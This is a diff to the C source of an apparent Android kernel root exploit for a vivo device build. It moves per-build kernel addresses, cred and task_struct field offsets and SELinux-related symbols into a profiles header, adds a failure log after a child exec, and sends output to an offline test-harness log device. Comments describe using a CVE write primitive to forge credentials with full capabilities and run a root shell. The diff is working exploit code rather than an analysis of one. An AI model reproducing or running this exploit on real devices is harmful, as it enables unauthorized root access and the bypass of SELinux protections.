@@ -71,7 +71,8 @@
 
 /* ---- per-build constants -----------------------------------------------
  *
- * Everything below describes one kernel image.  Porting to another build
+ * Everything that describes one kernel image lives in profiles.h, selected
+ * with -DIC_PROFILE_<name> (default: PD2571).  Porting to another build
  * means re-deriving all four groups:
  *   - static addresses  = /proc/kallsyms minus slide,
  *                         slide = _text - KIMAGE_TEXT_BASE
@@ -86,53 +87,7 @@
  * g_slide is measured at run time from the timer alloc site, so a different
  * link base shifts every static address consistently and cancels out.
  */
-
-/* do_timer_create's kmem_cache_alloc return-site. */
-#define STATIC_TIMER_SITE 0xffffffc0081a1a0cULL
-#define TIMER_SITE_LOW21 0x1a1a0cULL
-#define TIMER_ALLOC 0x108ULL
-
-/* cred_jar: bytes_req=0xb8, HWCACHE-aligned size=0xc0. */
-#define CRED_REQ 0xb8ULL
-#define CRED_ALLOC 0xc0ULL
-
-/* Link-time addresses (embedded kallsyms minus the KASLR slide). */
-#define SELINUX_STATE_STATIC 0xffffffc00a55a4f0ULL
-#define PANIC_ON_WARN_STATIC 0xffffffc00a1cae08ULL
-#define CRED_UID_OFF 0x8ULL
-
-/* task_struct layout (BTF). */
-#define OFF_TASK_CRED 0x838ULL
-#define COPY_PROCESS_LOW21 0xad8d4ULL
-#define TASK_ALLOC_BYTES 0x1500ULL
-#define FULLCAP 0x1ffffffffffULL
-
-/* cred internal offsets (BTF).  The CVE primitive is an 8-byte store, so
- * these must land on the exact field: writing one word too early here makes
- * cap_inheritable invalid and execve() returns EINVAL before anything runs. */
-#define OFF_CRED_CAP_INH 0x2cULL
-#define OFF_CRED_CAP_PERM 0x34ULL
-#define OFF_CRED_CAP_EFF 0x3cULL
-#define OFF_CRED_CAP_BSET 0x44ULL
-#define OFF_CRED_CAP_AMB 0x4cULL
-#define OFF_CRED_SECURITY 0x78ULL
-#define OFF_CRED_USER 0x80ULL
-#define OFF_CRED_USER_NS 0x88ULL
-#define OFF_CRED_UCOUNTS 0x90ULL
-#define OFF_CRED_GROUP_INFO 0x98ULL
-
-/* Link-time symbols for the fake cred's refcounted sub-objects. */
-#define ROOT_USER_STATIC 0xffffffc00a1f1208ULL
-#define INIT_USER_NS_STATIC 0xffffffc00a1f0f70ULL
-#define INIT_UCOUNTS_STATIC 0xffffffc00a1f2ab8ULL
-#define INIT_GROUPS_STATIC 0xffffffc00a1f2528ULL
-#define SELINUX_BLOB_OFF 0x0ULL
-#define SELINUX_SID_KERNEL 1U /* selinux_init writes osid/sid=1/1 */
-
-/* One timer/task allocation path on this image; keep the second slot compatible. */
-#define STATIC_TIMER_SITE_2 0xffffffc0081a1a0cULL
-#define TIMER_SITE_LOW21_2 0x1a1a0cULL
-#define COPY_PROCESS_LOW21_2 0xad8d4ULL
+#include "profiles.h"
 static int g_timer_site_kind = 0;
 
 /* vivo vr.ko: __tracepoint_sys_exit, funcs at +0x40 on this ABI.  Layout
@@ -140,8 +95,6 @@ static int g_timer_site_kind = 0;
  * (the +0x00 qword points at the "sys_exit" string, +0x40 is the only NULL
  * callback slot).  A newer kernel that grows another member before funcs
  * shifts this -- re-check against BTF after any kernel bump. */
-#define TP_STATIC 0xffffffc00a3c9ec0ULL
-#define TP_FUNCS_OFF 0x40ULL
 #define KSU_PKG "me.weishu.kernelsu"
 
 #define CHILD_HELLO 0x52445931
@@ -1921,6 +1874,7 @@ static unsigned long long leak_cred(unsigned char *raw,
                 char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};
 
                 execve("/proc/self/exe", av, ep);
+                logf("[-] leak child exec failed errno=%d\n", errno);
             }
             _exit(127);
         }
@@ -2195,6 +2149,24 @@ int main(int argc, char **argv)
     int shell_mode = 0, leak_only = 0, ids_only = 0;
 
     setvbuf(stdout, NULL, _IONBF, 0);
+    /* Offline harness channel.  The initrd's init mknods /dev/ic-out as a
+     * clone of the console and labels it null_device, which the shell domain
+     * may write even while the policy is enforced; redirect both stdio
+     * streams there when it exists so the run stays observable.  Absent on
+     * the device, where the caller already wired up our stdio. */
+    {
+        const char *lp = getenv("IC_LOG_PATH");
+        int lfd = lp && *lp ? open(lp, O_WRONLY | O_APPEND | O_CLOEXEC) :
+                              open("/dev/ic-out", O_WRONLY | O_APPEND | O_CLOEXEC);
+
+        if (lfd >= 0)
+        {
+            (void)dup2(lfd, 1);
+            (void)dup2(lfd, 2);
+            if (lfd > 2)
+                close(lfd);
+        }
+    }
     setsid();
     signal(SIGHUP, SIG_IGN);
     signal(SIGINT, SIG_IGN);
